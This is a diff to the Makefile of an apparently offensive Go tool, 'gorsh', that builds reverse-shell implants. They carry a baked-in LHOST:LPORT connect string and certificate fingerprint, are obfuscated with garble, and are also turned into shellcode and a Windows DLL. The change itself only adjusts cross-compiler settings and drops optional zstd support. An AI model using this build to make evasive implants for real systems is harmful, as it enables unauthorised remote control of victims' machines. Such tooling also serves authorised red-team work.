@@ -16,38 +16,22 @@ PORT  ?= 8443
 FINGERPRINT = $(shell openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2)
 LDFLAGS = "-s -w -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=${FINGERPRINT}"
 
-# Only set mingw on Linux
-ifeq ($(OS),Windows_NT)
-	CC=$(shell go env CC)
-else
-	ifeq ($(OS),Darwin)
-		CC=$(shell go env CC)
-	endif
-	CC=x86_64-w64-mingw32-gcc
-endif
-
 GARBLE = ${GOPATH}/bin/garble
 GODONUT = ${GOPATH}/bin/go-donut
 SOCAT = /usr/bin/socat
 
-# zStd is a highly efficient compression library that requires CGO compilation.
-# If you'd like to turn this feature on and have experience cross-compiling 
-# with cgo, enable the feature by uncommenting the following 3 lines
-# (macos not supported)
-# ENV.windows = CGO_ENABLED=1 CC=${CC}
-# ZSTD.windows = -tags zstd
-# ZSTD.linux = -tags zstd
+ifneq ($(UNAME), Windows)
+	DLLCC=x86_64-w64-mingw32-gcc
+endif
 
 .PHONY: all
 all: $(PLATFORMS) shellcode dll
 
 .PHONY: $(PLATFORMS)
 ${PLATFORMS}: $(SRV_KEY) $(GARBLE)
-	${ENV.${target}} \
 	GOOS=${target} ${BUILD} \
 		-buildmode pie \
 		-ldflags ${LDFLAGS} \
-		${ZSTD.${target}} \
 		-o ${OUT}/${APP}.${target} \
 		cmd/gorsh/main.go
 
@@ -68,7 +52,7 @@ shellcode: $(GODONUT) windows
 
 .PHONY: dll
 dll:
-	CGO_ENABLED=1 CC=${CC} \
+	CGO_ENABLED=1 CC=${DLLCC} \
 	GOOS=windows ${BUILD} \
 		-buildmode=c-shared \
 		-trimpath \
